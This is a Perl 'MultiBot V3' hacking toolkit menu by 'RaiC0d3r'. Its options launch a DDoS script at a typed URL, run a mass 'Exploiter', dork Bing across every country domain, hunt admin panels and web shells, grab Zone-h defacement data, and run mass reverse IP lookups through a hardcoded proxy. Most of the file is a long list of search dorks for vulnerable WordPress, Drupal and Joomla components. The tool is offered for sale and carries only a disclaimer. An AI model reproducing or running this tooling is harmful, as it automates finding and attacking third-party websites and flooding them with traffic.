#!/usr/bin/perl

use Socket;
use Getopt::Long;
use Parallel::ForkManager;
use Time::HiRes qw( usleep gettimeofday ) ;
use Win32::Console::ANSI;
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor;
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();

use MIME::Base64;
use WWW::Mechanize;
use threads;


if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

print color('bold red');
print q(
                   ...
                 ;::::;    MultiBot V3 Starting...
               ;::::; :;    By RaiC0d3r xD
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
                                          
                                          
                                                  gitHub.com/raic0d3r

     Note! : We don't Accept any responsibility for any illegal usage. 
                
);
print color('reset');

print color('bold red'),"[";
print color('bold green'),"1";
print color('bold red'),"] ";
print color('bold white'),"Exploiter\n";
print color('bold red'),"[";
print color('bold green'),"2";
print color('bold red'),"] ";
print color('bold white'),"DDos\n";
print color('bold red'),"[";
print color('bold green'),"3";
print color('bold red'),"] ";
print color('bold white'),"Bing Dorker\n";
print color('bold red'),"[";
print color('bold green'),"4";
print color('bold red'),"] ";
print color('bold white'),"CMS Detector\n";
print color('bold red'),"[";
print color('bold green'),"5";
print color('bold red'),"] ";
print color('bold white'),"Find Admin Panel\n";
print color('bold red'),"[";
print color('bold green'),"6";
print color('bold red'),"] ";
print color('bold white'),"Mass IP LookUp\n";
print color('bold red'),"[";
print color('bold green'),"7";
print color('bold red'),"] ";
print color('bold white'),"Shell Finder\n";
print color('bold red'),"[";
print color('bold green'),"8";
print color('bold red'),"] ";
print color('bold white'),"Tools\n";
print color('bold red'),"[";
print color('bold green'),"9";
print color('bold red'),"] ";
print color('bold white'),"About Me\n";
print color('bold red'),"[";
print color('bold green'),"10";
print color('bold red'),"] ";
print color('bold white'),"Zone-h Grabber\n";
print color('bold red'),"[";
print color('bold green'),"11";
print color('bold red'),"] ";
print color('bold white'),"Exit\n";

my $whatraiwant = <STDIN>;
chomp $whatraiwant;
if($whatraiwant eq '1')
{
$list= "mass.txt";
system("python bot.py 3");
}
if($whatraiwant eq '2'){
print color('bold red'),"[";
print color('bold green'),"";
print color('bold red'),"] ";
print color('bold white'),"Write url\n";
my $whatddoswant = <STDIN>;
chomp $whatddoswant;
system("python ddos.py ($whatddoswant)");
}
if($whatraiwant eq '3'){
bing();
}
if($whatraiwant eq '4'){
system("perl cms.pl");
}
if($whatraiwant eq '5'){
system("python apf.py");
}
if($whatraiwant eq '6'){
iplokk();
}
if($whatraiwant eq '7'){
shellfinder();
}
if($whatraiwant eq '8'){
toolzi();
}
if($whatraiwant eq '11'){
exit;
}
if($whatraiwant eq '10')
{
system("php grabber.php");
}

if($whatraiwant eq '9'){

$Rai="  ____               ____             
 |  _ \             |  _ \            
 | |_) |_   _  ___  | |_) |_   _  ___ 
 |  _ <| | | |/ _ \ |  _ <| | | |/ _ \
 | |_) | |_| |  __/ | |_) | |_| |  __/
 |____/ \__, |\___| |____/ \__, |\___|
         __/ |              __/ |     
        |___/              |___/      <3
		peace Ya Men
		";
$DELAY = ($ARGV[0] =~ /^-([.\d]+)/) ? (shift, $1) : 1;
$| = 1;
$_ ="Name : Raihan Uddin
For sell by Owner Only
Contact Me with Facebook : https://www.facebook.com/raihan.uddin.3344\nOr email : Rai @ gmail.com\nIf the tool leaked Do Not contact me For more information\n\n";
while ($_) {
    for (split(//)) {
            print;
                    select(undef,undef,undef, 0.005 * 20);
                      }
        $_ = "";
           }
print color 'bold red';
print $Rai;

}

sub iplokk(){

print color('bold red');
print q(
                       Mass Reverse Lookup
                        Coded By Rai
                         
        [+]===================[!]===================[+]
                
);
print color('reset');

$reverse_options = "
\tChoose an option for Reverse IP Lookup...!!!

	\t[1]  From One Site
	\t[2]  From Site List
	\n";
print colored("$reverse_options", 'bold green');
print colored("\n\t\tI wanna choose >>>>  ",'BOLD BLUE');
my $reverse_option = <STDIN>;
chomp $reverse_option;

my $rai = ("http://80.211.186.39:3128");
chomp $rai;
	
if ($reverse_option eq '1') {
	print colored("\n\t\tEnter the site >>>>  ",'BOLD BLUE');
	$single = <STDIN>;
	chomp $single;
	$single_look = "https://api.hackertarget.com/reverseiplookup/?q=$single";
	$ua = LWP::UserAgent->new(keep_alive => 1);
	$ua->proxy('https', ("$rai"));
	$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
	$ua->timeout (8);
	my $checar = $ua->get("$single_look")->content;
	if ($checar =~/No records found for/) {
		print colored("\t[-] $ip have no reverse site found :(\n",'BOLD YELLOW');
	}
	elsif ($checar =~/error check your search parameter/) {
		print colored("\t[-] $ip is wrong IP or its down :|\n",'BOLD RED');
	}
	else {
		print colored("\n [+] $ip Grabbing done :)\n",'BOLD GREEN');
		open(save, '>>mass.txt');
		print save "$checar\n";
		close(save);
	}
}
elsif ($reverse_option eq '2') {
	print colored("\n\t\tEnter site list >>>>  ",'BOLD BLUE');
	$list=<STDIN>;
	chomp($list);
	open my($fh), '<:raw', $list or die "Can't open File...!!";
	while( sysread $fh, $buffer, 4096 ) {
	    $lines += ( $buffer =~ tr/\n// );
	}
	close $fh;
	print colored("\n\tGot $lines IP in the list dude...!!!\n",'BOLD YELLOW');
	print colored("\tGrabbing reverse from these one by one....Wait until finish...!!!\n",'BOLD YELLOW');
	print "\n\n";
	open(target,"<$list") or die "Can't open list";
	while (<target>) {
		chomp($_);
		$ip = $_;
		if ($ip =~ /https:\/\// && $ip =~ /http:\/\// ) {
			$ip = "$ip";
		}
		rev_mass();
	}
	sub rev_mass() {
		$mass_look = "https://api.hackertarget.com/reverseiplookup/?q=$ip";
		$ua = LWP::UserAgent->new(keep_alive => 1);
	    $ua->proxy('https', ("$rai")); 
		$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
		$ua->timeout (8);
		my $checar = $ua->get("$mass_look")->content;
		if ($checar =~/No records found for/) {
			print colored("\tNo reverse site found :(\n",'BOLD YELLOW');
		}
		elsif ($checar =~/error check your search parameter/) {
			print colored("\tWrong or its down :|\n",'BOLD RED');
		}
		else {
			print colored("\n [+] Grabbing done :)\n",'BOLD GREEN');
			open(save, '>>mass.txt');
			print save "$checar\n";
			close(save);
		}
	}
}
else {
	print colored("\n\nWrong Option Dude....Next time choose a valid option...!!!",'BOLD RED');
}
}

sub bing(){
system('cls');


print color('bold red');
print q(
                           Bing Dorker
                        Coded By Rai
                         
        [+]===================[!]===================[+]
                
);
print color('reset');

print color("green"), "[1] World Wide     |> World Wide Grabber\n";
print color("green"), "[2] Mass Site Dump |> By Ip or Websites List\n";
print color("green"), "[3] Mass Site Dump |> Range Ip by Ip or Wbesite list\n";
print color("green"), "[4] i'm Idiot And I Don't Know What To Do \n";
print color("green"), "[5] Random Ip Genrator \n";
my $targett = <STDIN>;
chomp $targett;



if($targett eq '1')
{
print "[Just Put Your Dork And I will Scan All World Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
gassone();
}
}


if($targett eq '2')
{
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
get();
}else{
get();
}

}


}
if($targett eq '3')
{
spyx2();
sub spyx2(){
print "[Put A Ip List chen3a.txt]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);

  open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();

}else{
gett();
}

}
}
}


if($targett eq '4')
{
print ("
            Drupal Dorks: 
user/login powered by drupal
user/login
node/1
node/1
node/add/page
?q=user/1
?q=user/2
?q=user/3
?q=user/4
?q=user/5
            Wordpress Dorks :
inurl:/wp-content/plugins/gravityforms/
/wp-content/plugins/gravityforms/
index of /wp-content/uploads/gravity_forms/
inurl:/wp-content/uploads/gravity_forms/
inurl:/wp-content/plugins/gravityforms/
inurl:wp-content/plugins/revslider/
inurl:revslider
inurl:revslider_admin.php
inurl:revslider_front.php
inurl:plugins/revslider/
intext:Powered by Revslider
intitle:Index Of/ revslider
intitle:Index Of/wp-content/plugins/revslider
intitle:Index Of/admin/revslider
Index Of/admin/revslider
Index Of/wp-content/plugins/revslider
Index Of/ revslider
revslider_admin.php
inurl:dhia_jridi
/wp-admin/admin-post.php?page=wysija
admin-post.php?page=wysija 
                Joomla Dorks :
inurl:/index.php?option=com_jce
index.php?option=com_jce
index.php?option=com_aardvertiser
index.php?option=com_akobook
index.php?option=com_abbrev
index.php?option=com_gk3_photoslide
index.php?option=com_abc
index.php?option=com_aclassf
index.php?option=com_acprojects
index.php?option=com_acstartseite
index.php?option=com_acteammember
index.php?option=com_actions
index.php?option=com_acymailing
index.php?option=com_addressbook
index.php?option=com_adds
index.php?option=com_rsticketspro
index.php?option=com_adsmanager
index.php?option=com_advertising
index.php?option=com_ag_vodmatvil
index.php?option=com_agency
index.php?option=com_agenda
index.php?option=com_ajaxchat
index.php?option=com_alameda
index.php?option=com_alfresco
index.php?option=com_alfurqan15x
index.php?option=com_allcinevid
index.php?option=com_traxartist
index.php?option=com_flippingbook
index.php?option=com_amblog
index.php?option=com_aml_2
index.php?option=com_annonces
index.php?option=com_appointinator
index.php?option=com_appointment
index.php?option=com_aprice
index.php?option=com_arcadegames
index.php?option=com_archeryscores
index.php?option=com_articleman
index.php?option=com_articlemanager
index.php?option=com_autartimonial
index.php?option=com_avosbillets
index.php?option=com_awiki
index.php?option=com_uhp
index.php?option=com_beamospetition
index.php?option=com_beamspetition
index.php?option=com_bfquiztrial
index.php?option=com_bfsurvey
index.php?option=com_bfsurvey_basic
index.php?option=com_bfsurvey_pro
index.php?option=com_biblestudy
index.php?option=com_biblioteca
index.php?option=com_bidding
index.php?option=com_billyportfolio
index.php?option=com_blog
index.php?option=com_blogfactory
index.php?option=com_book
index.php?option=com_bookflip
index.php?option=com_booklibrary
index.php?option=com_btg_oglas
index.php?option=com_caddy
index.php?option=com_calcbuilder
index.php?option=com_calendario
index.php?option=com_canteen
index.php?option=com_carman
index.php?option=com_cartikads
index.php?option=com_cartweberp
index.php?option=com_casino
index.php?option=com_category
index.php?option=com_cbe
index.php?option=com_cbresumebuilder
index.php?option=com_ccboard
index.php?option=com_ccinvoices
index.php?option=com_ccnewsletter
index.php?option=com_ccrowdsource
index.php?option=com_cgtestimonial
index.php?option=com_chronocontact
index.php?option=com_clan
index.php?option=com_clanlist
index.php?option=com_clantools
index.php?option=соm_рhilаfоrm
index.php?option=com_easybook
index.php?option=com_simpleboard
index.php?option=com_admin
index.php?option=com_htmlarea3_xtd-c
index.php?option=com_sitemap
index.php?option=com_ewriting
index.php?option=com_performs
index.php?option=com_forum
index.php?option=com_productshowcase
index.php?option=com_menus
index.php?option=com_musica
index.php?option=com_colorlab
index.php?option=com_community
index.php?option=com_comp
index.php?option=com_componen
index.php?option=com_component
index.php?option=com_connect
index.php?option=com_content
index.php?option=com_contentbloglist
index.php?option=com_countries
index.php?option=com_crowdsource
index.php?option=com_cvmaker
index.php?option=com_dailymeals
index.php?option=com_dashboard
index.php?option=com_dateconverter
index.php?option=com_datsogallery
index.php?option=com_myalbum
index.php?option=com_dcnews
index.php?option=com_delicious
index.php?option=com_diary
index.php?option=com_digifolio
index.php?option=com_digistore
index.php?option=com_dioneformwizard
index.php?option=com_dir
index.php?option=com_discussions
index.php?option=com_djclassifieds
index.php?option=com_dms
index.php?option=com_doqment
index.php?option=com_drawroot
index.php?option=com_dshop
index.php?option=com_education_classess
index.php?option=com_elite_experts
index.php?option=com_eportfolio
index.php?option=com_equipment
index.php?option=com_esearch
index.php?option=com_event
index.php?option=com_eventcal
index.php?option=com_eventing
index.php?option=com_extcalendar
index.php?option=com_mospray
index.php?option=com_smf
index.php?option=com_pollxt
index.php?option=com_ezautos
index.php?option=com_loudmounth
index.php?option=com_videodb
index.php?option=com_ezine
index.php?option=com_family
index.php?option=com_fastball
index.php?option=com_fireboard
index.php?option=com_flashgames
index.php?option=com_flexicontent
index.php?option=com_flipwall
index.php?option=com_football
index.php?option=com_forme
index.php?option=com_fss
index.php?option=com_g2bridge
index.php?option=com_gambling
index.php?option=com_gamesbox
index.php?option=com_gantry
index.php?option=com_gbufacebook
index.php?option=com_gds
index.php?option=com_gigfe
index.php?option=com_golfcourseguide
index.php?option=com_google
index.php?option=com_graphics
index.php?option=com_grid
index.php?option=com_gsticketsystem
index.php?option=com_guide
index.php?option=com_hbssearch
index.php?option=com_hdflvplayer
index.php?option=com_hdvideoshare
index.php?option=com_hello
index.php?option=com_hezacontent
index.php?option=com_hitexam
index.php?option=com_hmcommunity
index.php?option=com_horoscope
index.php?option=com_hotbrackets
index.php?option=com_huruhelpdesk
index.php?option=com_if_nexus
index.php?option=com_ijoomla_archive
index.php?option=com_ijoomla_rss
index.php?option=com_img
index.php?option=com_immobilien
index.php?option=com_include
index.php?option=com_intuit
index.php?option=com_iotaphotogallery
index.php?option=com_iproperty
index.php?option=com_ircmbasic
index.php?option=com_itarmory
index.php?option=com_items
index.php?option=com_jacomment
index.php?option=com_jashowcase
index.php?option=com_javoice
index.php?option=com_jbook
index.php?option=com_jbpublishdownfp
index.php?option=com_jce
index.php?option=com_jcollection
index.php?option=com_jdirectory
index.php?option=com_jdownloads
index.php?option=com_jdrugstopics
index.php?option=com_jeajaxeventcalendar
index.php?option=com_jeauto
index.php?option=com_jedirectory
index.php?option=com_jeemaarticlecollection
index.php?option=com_jeemasms
index.php?option=com_jefaqpro
index.php?option=com_jeguestbook
index.php?option=com_jepoll
index.php?option=com_jequoteform
index.php?option=com_jesectionfinder
index.php?option=com_jestory
index.php?option=com_jesubmit
index.php?option=com_jfuploader
index.php?option=com_jgen
index.php?option=com_jim
index.php?option=com_jimtawl
index.php?option=com_jinc
index.php?option=com_jlord_rss
index.php?option=com_jmsfileseller
index.php?option=com_jnewsletter
index.php?option=com_jnewspaper
index.php?option=com_job
index.php?option=com_jomdocs
index.php?option=com_jomestate
index.php?option=com_jomsocial
index.php?option=com_jomtube
index.php?option=com_joomdle
index.php?option=com_joomdocs
index.php?option=com_joomgalleryfunc
index.php?option=com_joomlaconnect_be
index.php?option=com_joomlaflashfun
index.php?option=com_joomlaflickr
index.php?option=com_joomlaupdater
index.php?option=com_joomla-visites
index.php?option=com_joommail
index.php?option=com_joomnik
index.php?option=com_joomportfolio
index.php?option=com_joomtouch
index.php?option=com_jp_jobs
index.php?option=com_jphone
index.php?option=com_jpodium
index.php?option=com_j-projects
index.php?option=com_jquarks4s
index.php?option=com_jreactions
index.php?option=com_jreservation
index.php?option=com_jscalendar
index.php?option=com_jshop
index.php?option=com_jstore
index.php?option=com_jsubscription
index.php?option=com_jsupport
index.php?option=com_jtickets
index.php?option=com_jtm
index.php?option=com_jukebox
index.php?option=com_juliaportfolio
index.php?option=com_jwhmcs
index.php?option=com_k2
index.php?option=com_king
index.php?option=com_kk
index.php?option=com_konsultasi
index.php?option=com_ksadvertiser
index.php?option=com_kunena
index.php?option=com_lead
index.php?option=com_leader
index.php?option=com_libros
index.php?option=com_listbingo
index.php?option=com_listing
index.php?option=com_lovefactory
index.php?option=com_lyftenbloggie
index.php?option=com_maianmedia
index.php?option=com_manager
index.php?option=com_market
index.php?option=com_magazine
index.php?option=com_marketplace
index.php?option=com_markt
index.php?option=com_matamko
index.php?option=com_mdigg
index.php?option=com_media_library
index.php?option=com_mediamall
index.php?option=com_mediqna
index.php?option=com_memory
index.php?option=com_menu
index.php?option=com_mochigames
index.php?option=com_mosres
index.php?option=com_mtfireeagle
index.php?option=com_mtree
index.php?option=com_multimap
index.php?option=com_multiroot
index.php?option=com_mamml
index.php?option=com_mycar
index.php?option=com_mycontent
index.php?option=com_myfiles
index.php?option=com_myhome
index.php?option=com_mysms
index.php?option=com_na_content
index.php?option=com_na_newsdescription
index.php?option=com_nicetalk
index.php?option=com_network
index.php?option=com_newsletter
index.php?option=com_fq
index.php?option=com_newsfeeds
index.php?option=com_nfnaddressbook
index.php?option=com_ninjamonials
index.php?option=com_noticeboard
index.php?option=com_noticias
index.php?option=com_obsuggest
index.php?option=com_oprykningspoint_mc
index.php?option=com_ops
index.php?option=com_otzivi
index.php?option=com_oziogallery2
index.php?option=com_packages
index.php?option=com_pandafminigames
index.php?option=com_pandarminigames
index.php?option=com_pbbooking
index.php?option=com_pc
index.php?option=com_securityimages
index.php?option=com_artlinks
index.php?option=com_people
index.php?option=com_perchagallery
index.php?option=com_galleria
index.php?option=com_phocadocumentation
index.php?option=com_phocagallery
index.php?option=com_photobattle
index.php?option=com_photomapgallery
index.php?option=com_php
index.php?option=com_picsell
index.php?option=com_portfol
index.php?option=com_portfolio
index.php?option=com_powermail
index.php?option=com_press
index.php?option=com_prime
index.php?option=com_pro_desk
index.php?option=com_properiesaid
index.php?option=com_propertylab
index.php?option=com_question
index.php?option=com_quickfaq
index.php?option=com_radio
index.php?option=com_record
index.php?option=com_restaurant
index.php?option=com_restaurantmenumanager
index.php?option=com_rokmodule
index.php?option=com_rsappt_pro
index.php?option=com_rsappt_pro2
index.php?option=com_rscomments
index.php?option=com_rsform
index.php?option=com_rsgallery2
index.php?option=com_rssreader
index.php?option=com_s2clanroster
index.php?option=com_sar_news
index.php?option=com_science
index.php?option=com_searchlog
index.php?option=com_sebercart
index.php?option=com_serie
index.php?option=com_sermonspeaker
index.php?option=com_seyret
index.php?option=com_simplefaq
index.php?option=com_simpleshop
index.php?option=com_smartsite
index.php?option=com_socialads
index.php?option=com_software
index.php?option=com_solution
index.php?option=com_soundset
index.php?option=com_serverstat
index.php?option=com_spa
index.php?option=com_spartsite
index.php?option=com_spec
index.php?option=com_spielothek
index.php?option=com_sportfusion
index.php?option=com_spsnewsletter
index.php?option=com_sqlreport
index.php?option=com_start
index.php?option=com_staticxt
index.php?option=com_surveymanager
index.php?option=com_svmap
index.php?option=com_sweetykeeper
index.php?option=com_tariff
index.php?option=com_teacher
index.php?option=com_team
index.php?option=com_teams
index.php?option=com_techfolio
index.php?option=com_television
index.php?option=com_tender
index.php?option=com_timereturns
index.php?option=com_timetrack
index.php?option=com_topmenu
index.php?option=com_tour
index.php?option=com_tpjobs
index.php?option=com_trabalhe_conosco
index.php?option=com_trading
index.php?option=com_travelbook
index.php?option=com_ttvideo
index.php?option=com_tupinambis
index.php?option=com_ultimateportfolio
index.php?option=com_units
index.php?option=com_universal
index.php?option=com_users
index.php?option=com_vat
index.php?option=com_vehiclemanager
index.php?option=com_vid
index.php?option=com_vikrealestate
index.php?option=com_vjdeo
index.php?option=com_vxdate
index.php?option=com_wallpapers
index.php?option=com_weblinks
index.php?option=com_webtv
index.php?option=com_wgpicasa
index.php?option=com_wmi
index.php?option=com_wmptic
index.php?option=com_wmtpic
index.php?option=com_wrapper
index.php?option=com_xcloner-backupandrestore
index.php?option=com_xevidmegahd
index.php?option=com_xgallery
index.php?option=com_xmovie
index.php?option=com_yanc
index.php?option=com_yvhotels
index.php?option=com_zimbcomment
index.php?option=com_zimbcore
index.php?option=com_zina
index.php?option=com_zoom
index.php?option=com_zoomprotfolio
index.php?option=com_fm
index.php?option=phocaguestbook
index.php?option=mailto
index.php?option=con_extplorer
index.php?option=com_worldrates
index.php?option=com_glossary
index.php?option=com_musepoes
index.php?option=com_buslicense
index.php?option=com_recipes
index.php?option=com_jokes
index.php?option=com_estateagent
index.php?option=com_catalogshop
index.php?option=com_akogallery
index.php?option=com_garyscookbook
index.php?option=com_flyspray
index.php?option=com_hashcash
index.php?option=com_mambads
index.php?option=com_hotproperty
index.php?option=com_directory
index.php?option=com_awesom
index.php?option=com_shambo2
index.php?option=com_downloads
index.php?option=com_peoplebook
index.php?option=com_guest
index.php?option=com_quote
index.php?option=com_gallery
index.php?option=com_neogallery
index.php?option=com_comments
index.php?option=com_rapidrecipe
index.php?option=com_board
index.php?option=com_xfaq
index.php?option=com_paxxgallery
index.php?option=com_quiz
index.php?option=com_ricette
index.php?option=com_jooget
index.php?option=com_jotloader
index.php?option=com_jradio
index.php?option=com_jquarks
index.php?option=com_sponsorwall
index.php?option=com_registration
index.php?option=com_zoomportfolio
index.php?option=com_dirfrm
index.php?option=com_jgrid
index.php?option=com_ongallery
index.php?option=com_neorecruit
index.php?option=com_joomla
index.php?option=com_youtube
index.php?option=com_sar
index.php?option=com_jsjobs
index.php?option=com_beeheard
index.php?option=com_activehelper
index.php?option=com_camp
index.php?option=com_awdwall
index.php?option=com_joltcard
index.php?option=com_if
index.php?option=com_gadgetfactory
index.php?option=com_qpersonel
index.php?option=com_mv
index.php?option=com_weberpcustomer
index.php?option=com_articles
index.php?option=com_webeecomment
index.php?option=com_xobbix
index.php?option=com_loginbox
index.php?option=com_shoutbox
index.php?option=com_dwgraphs
index.php?option=com_xmap
index.php?option=com_business
index.php?option=com_departments
index.php?option=com_smestorage
index.php?option=com_aml
index.php?option=com_flash
index.php?option=com_jwmmxtd
index.php?option=com_giftexchange
index.php?option=com_jeformcr
index.php?option=com_org
index.php?option=com_about
index.php?option=com_color
index.php?option=com_party
index.php?option=com_liveticker
index.php?option=com_joomlaconnect
index.php?option=com_communitypolls
index.php?option=com_videos
index.php?option=com_productbook
index.php?option=com_photoblog
index.php?option=com_jequizmanagement
index.php?option=com_biographies
index.php?option=com_gurujibook
index.php?option=com_gameserver
index.php?option=com_jvideodirect
index.php?option=com_rd
index.php?option=com_artistavenue
index.php?option=com_airmonoblock
index.php?option=com_dhforum
index.php?option=com_trabalhe
index.php?option=com_oprykningspoint
index.php?option=com_adagency
index.php?option=com_morfeoshow
index.php?option=com_mediaslide
index.php?option=com_jcalpro
index.php?option=com_zcalendar
index.php?option=com_acmisc
index.php?option=com_virtuemart
index.php?option=com_docman
index.php?option=com_joomgallery
index.php?option=com_mojo
index.php?option=com_joaktree
index.php?option=com_mygallery
index.php?option=Com_Joomclip
index.php?option=com_mytube
index.php?option=com_jbudgetsmagic
index.php?option=com_rsmonials
index.php?option=com_cmimarketplace
index.php?option=com_mailto
index.php?option=com_maianmusic
index.php?option=com_pcchess
index.php?option=com_prod
index.php?option=com_waticketsystem
index.php?option=com_news
index.php?option=com_pccookbook
index.php?option=com_fantasytournament
index.php?option=com_camelcitydb
index.php?option=com_paxgallery
index.php?option=com_ice
index.php?option=com_livechat
index.php?option=com_feederator
index.php?option=com_competitions
index.php?option=com_clickheat
index.php?option=com_dailymessage
index.php?option=com_ignitegallery
index.php?option=com_joomtracker
index.php?option=com_hotspots
index.php?option=com_is
index.php?option=com_gameq
index.php?option=com_prayercenter
index.php?option=com_webhosting
index.php?option=com_alphacontent
index.php?option=com_filiale
index.php?option=com_extplorer
index.php?option=com_actualite
index.php?option=com_d
index.php?option=com_astatspro
index.php?option=com_search
index.php?option=com_expose
index.php?option=com_philaform
index.php?option=com_mosmedia
index.php?option=com_thopper
index.php?option=com_resman
index.php?option=com_poll
index.php?option=com_kochsuite
index.php?option=com_linkdirectory
index.php?option=com_lmo
index.php?option=com_rss
index.php?option=com_oziogallery
index.php?option=com_noticia
index.php?option=com_kkcontent
index.php?option=com_jphoto
index.php?option=com_quicknews
index.php?option=com_musicgallery
index.php?option=com_pinboard
index.php?option=com_amocourse
index.php?option=com_jfusion
index.php?option=com_misterestate
index.php?option=com_tpdugg
index.php?option=com_alphauserpoints
index.php?option=com_foobla
index.php?option=com_jlord
index.php?option=com_facebook
index.php?option=com_groupjive
index.php?option=com_jd
index.php?option=com_recerca
index.php?option=com_icrmbasic
index.php?option=com_album
index.php?option=com_lucygames
index.php?option=com_siirler
index.php?option=com_idoblog
index.php?option=com_pms
index.php?option=com_jobline
index.php?option=com_K
index.php?option=com_jumi
index.php?option=com_ijoomla
index.php?option=com_media
index.php?option=com_omphotogallery
index.php?option=com_seminar
index.php?option=com_jvideo
index.php?option=com_agoragroup
index.php?option=Com_Agora
index.php?option=com_rsgallery
index.php?option=com_bsadv
index.php?option=com_djiceshoutbox
index.php?option=com_rdautos
index.php?option=com_na
index.php?option=com_simple
index.php?option=com_allhotels
index.php?option=com_volunteer
index.php?option=com_tech
index.php?option=com_mydyngallery
index.php?option=com_jmovies
index.php?option=com_thyme
index.php?option=com_catalogproduction
index.php?option=com_contactinfo
index.php?option=com_jb
index.php?option=com_dadamail
index.php?option=com_ongumatimesheet
index.php?option=com_googlebase
index.php?option=com_treeg
index.php?option=com_ab
index.php?option=com_kbase
index.php?option=com_ionfiles
index.php?option=com_ds
index.php?option=com_mad
index.php?option=com_imagebrowser
index.php?option=com_user
index.php?option=com_ezstore
index.php?option=com_products
index.php?option=com_propertiesaid
index.php?option=com_qcontacts
index.php?option=com_quran
index.php?option=com_races
index.php?option=com_ranking
index.php?option=com_rd_download
index.php?option=com_realestatemanager
index.php?option=com_realtyna
index.php?option=com_redshop
index.php?option=com_remository
index.php?option=com_restaurantguide
index.php?option=com_rokdownloads
index.php?option=com_route
index.php?option=com_rwcards
index.php?option=com_s5clanroster
index.php?option=com_sbsfile
index.php?option=com_school
index.php?option=com_schools
index.php?option=com_dtregister
index.php?option=com_n
index.php?option=com_altas
index.php?option=com_vr
index.php?option=com_brightweblinks
index.php?option=com_versioning
index.php?option=com_xewebtv
index.php?option=com_jabode
index.php?option=com_netinvoice
index.php?option=com_expshop
index.php?option=com_yvcomment
index.php?option=com_joomladate
index.php?option=com_joomradio
index.php?option=com_eQuotes
index.php?option=com_acctexp
index.php?option=com_joobb
index.php?option=com_artist
index.php?option=com_xsstream
index.php?option=com_comprofiler
index.php?option=com_jpad
index.php?option=com_joomlaxplorer
index.php?option=com_onlineflashquiz
index.php?option=com_rekry
index.php?option=com_custompages
index.php?option=com_galeria
index.php?option=com_mcquiz
index.php?option=com_ynews
index.php?option=com_neoreferences
index.php?option=com_candle
index.php?option=com_joovideo
index.php?option=com_alberghi
index.php?option=com_restaurante
index.php?option=com_puarcade
index.php?option=com_jjgallery
index.php?option=com_jcs
index.php?option=com_mp
index.php?option=com_wmtportfolio
index.php?option=com_wmtgallery
index.php?option=com_panoramic
index.php?option=com_slideshow
index.php?option=com_joom
index.php?option=com_joomlaradiov
index.php?option=com_jombib
index.php?option=com_rsfiles
index.php?option=com_eventlist
index.php?option=com_gmaps
index.php?option=com_ponygallery
index.php?option=com_autostand
index.php?option=com_swmenufree
index.php?option=com_joomlaboard
index.php?option=com_webring
index.php?option=com_reporter
index.php?option=com_jeux
index.php?option=com_nfn
index.php?option=com_bayesiannaivefilter
index.php?option=com_doc
index.php?option=com_clasifier
index.php?option=com_hwdvideoshare
index.php?option=com_acajoom
index.php?option=com_facileforms
index.php?option=com_books
index.php?option=com_tophotelmodule
index.php?option=com_lowcosthotels
index.php?option=com_newsflash
index.php?option=com_gigcal
